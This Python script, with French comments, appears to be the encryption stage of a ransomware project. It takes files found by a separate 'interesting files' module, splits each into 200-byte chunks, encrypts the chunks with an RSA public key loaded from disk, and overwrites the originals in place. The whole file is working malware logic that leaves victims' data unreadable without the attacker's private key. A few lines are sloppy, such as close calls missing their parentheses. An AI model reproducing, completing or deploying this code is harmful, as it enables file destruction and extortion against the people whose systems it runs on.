import os
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
import Interistinf_Files2

#Génération des clefs privé / public
global key
global public_key

#IL faudra remplacer la ligne 66 le open par open(path,'rb')
"""
path = os.environ["appdata"] + "\\projet\\public.key"
"""


def rsa_encrypt(data_to_encrypt):
    rsa_public_key = RSA.importKey(public_key)
    rsa_public_key = PKCS1_OAEP.new(rsa_public_key)
    encrypted_text = rsa_public_key.encrypt(data_to_encrypt)

    return(encrypted_text)

def encrypt():
    path_file = Interistinf_Files2.main()
    for file in path_file:
        print(file)
        file_ = open(file, "rb")
        byte = file_.read()
        #encrypted_file = rsa_encrypt(byte)
        len_encrypted_file = size_of_file = os.path.getsize(file)
        file_.close()
        div_RSA_table =[]
        unit_RSA = 0
        print(len_encrypted_file)

        if len_encrypted_file > 200 :
            range_pourc = int(len_encrypted_file / 200) + (len_encrypted_file % 200 > 0)
            print(range_pourc)
            for i in range(range_pourc):
                if unit_RSA+200 > len_encrypted_file:
                    diffe = len_encrypted_file-(range_pourc*200) + 200
                    div_RSA_table.append(byte[unit_RSA:unit_RSA+diffe])
                else:
                    div_RSA_table.append(byte[0+unit_RSA:unit_RSA+200])
                    unit_RSA += 200
        else :
            div_RSA_table.append(byte[unit_RSA:len_encrypted_file])
            range_pourc = 1
            
        encrypted_part = []
        for i in range(range_pourc):
            encrypted_part.append(rsa_encrypt(div_RSA_table[i]))

        encrypted_part2 = b''.join(encrypted_part)
        file_ = open(file, "wb")
        file_.write(encrypted_part2)
        file_.close
        print("closed")
    return True

def main():
    global public_key
    content_file = open("encrypt/public.key", 'rb')
    public_key = content_file.read()
    content_file.close
    encrypt()

main()
